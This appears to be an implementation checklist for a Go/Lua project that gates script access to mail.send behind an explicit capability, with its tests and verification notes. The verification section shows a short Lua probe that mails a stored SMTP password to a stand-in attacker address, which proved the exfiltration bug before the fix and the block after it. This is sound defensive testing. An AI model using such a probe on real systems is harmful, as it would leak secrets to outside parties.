---
id: IMPL-IF18P5
type: implementation-checklist
title: 'Implementation: Capability-gate mail.send like http and ai'
status: done
---

<!-- @managed: claude-workflow v1 -->

## Development

- [x] Unit tests written for new code
- [x] Integration tests written (test full flow, not just units)
- [x] Happy path implemented
- [x] Edge cases from planning handled
- [x] Error handling in place (errors surfaced, not swallowed)

Four pieces, in the order they were committed:

1. **`Mail bool` on `lua.Capabilities`**, alongside `HTTP`/`AI`, and threaded
through every translation seam. `metamodel.Capabilities.Fields()` was the lever:
adding a return value broke all six consumers at COMPILE time rather than
letting any of them silently default to `false`.
2. **`luaMailSend` denies without the grant**, returning a typed error. The
binding stays REGISTERED unconditionally — the existing package doc is right
that a vanishing binding gives "attempt to call a nil value" exactly where an
operator needs a useful message. The two concerns are separable: always present,
refuses to send.
3. **`Mail: true` hard-wired** in `ScriptCapabilities.toLua()` for mail's own
send-script runtime, the one place the gate cannot apply. Follows the pattern
already there for `AI: false`, and the circularity is written down.
4. **A boot warning** (`internal/dataentry/mailgate.go`) naming actions whose
script calls `mail.send` without the grant, wired into the existing
action-enumeration loop in `app.go`. `openLocalScript` already returned the
body, so the content scan was a small change rather than a new mechanism.

## Test Quality

- [x] Using fixture builders or factories for test data
- [x] No hardcoded values in assertions when object is in scope
- [x] Only specifying values that matter for the test
- [x] Interpolated values constructed from objects, not hardcoded
- [x] Property comparisons use original object, not hardcoded strings

The best test here is `internal/metamodel/capabilities_test.go`, which asserts
`Fields()` returns exactly one value per struct field:

```go
structFields := reflect.TypeFor[Capabilities]().NumField()
http, ai, mail, writeFile, secrets := all.Fields()
require.Len(t, []any{http, ai, mail, writeFile, secrets}, structFields, ...)
```

That is worth more than the sum of its assertions: it makes ADDING a capability
without threading it a test failure, not a silent security hole. The next person
to extend `Capabilities` cannot repeat this bug.

Seams pinned individually (`internal/dataentry/capabilities_test.go`,
`internal/mail/script_test.go`, `internal/scheduler/jobs_test.go`) because the
scheduler round-trips the grant through a JSON job payload, where a dropped
field would survive compilation.

## Manual Verification

- [x] Feature manually tested end-to-end
- [x] Each acceptance criterion verified with test scenario from planning
- [x] Edge cases manually verified

**Verification Evidence:**

The defect was demonstrated before the fix with a throwaway probe: a runtime
holding a `secrets` grant and ZERO outbound capabilities exfiltrated the secret.

```lua
assert(http == nil, "no http capability")
assert(ai == nil, "no ai capability")
mail.send{to = "attacker@evil.test", subject = "x", text = rela.secrets.smtp_password}
```

Before: `LEAKED to=[attacker@evil.test] body="hunter2"`.

The same probe re-run against this branch, with the gate in place and no `Mail`
grant: **`BLOCKED: no message delivered without the Mail capability`**.

That is the acceptance test inverted, and it is the one that matters — it
exercises the exact attack the issue describes rather than the gate in
isolation.

| check | result |
| --- | --- |
| exfiltration probe, no `Mail` grant | BLOCKED, zero messages delivered |
| `go test ./internal/...` | all packages ok (dataentry 45.9s, lua 4.3s, mail 2.8s, metamodel 1.2s) |
| `golangci-lint run ./internal/...` | 0 issues |

Two lint findings were fixed rather than suppressed: a British spelling in a new
test comment, and a `reflect.TypeOf` that `modernize` wanted as
`reflect.TypeFor` — the latter in the capability-count test above.

## Quality

- [x] Code follows project patterns (check similar code)
- [x] Checked for DRY opportunities — repeated literals, expressions, or
patterns extracted to a helper / constant / type where it sharpens the contract
(don't extract for its own sake; CLAUDE.md "three similar lines is better than a
premature abstraction" still holds)
- [x] No security issues introduced
- [x] No silent failures (errors logged AND returned)
- [x] No debug code left behind

Follows the `http`/`ai` gating precedent (TKT-YH52OM) exactly, which is the
point: the operator asymmetry that justifies those applies here unchanged. An
unexpected `mail` capability on a long script STANDS OUT in a config file an
operator reviews; the same reach buried inside the script does not.

The existing package doc argued mail is "a service the PROJECT configured, not a
capability the script holds". That is true of the TRANSPORT — `.rela/mail.yaml`
is operator config, the same audited tier as `acl.yaml` — but it never addressed
AUTHORIZATION. "The project has mail configured" and "this script may send to an
arbitrary address" are different claims, and the doc treated establishing the
first as settling the second. The docs are rewritten accordingly rather than
appended to.

Backwards compatibility is deliberately NOT preserved: the gate defaults closed
and existing projects must grant it. Waived by the project owner. The boot
warning exists so an operator upgrading learns from a log line rather than from
a digest that silently stopped sending.
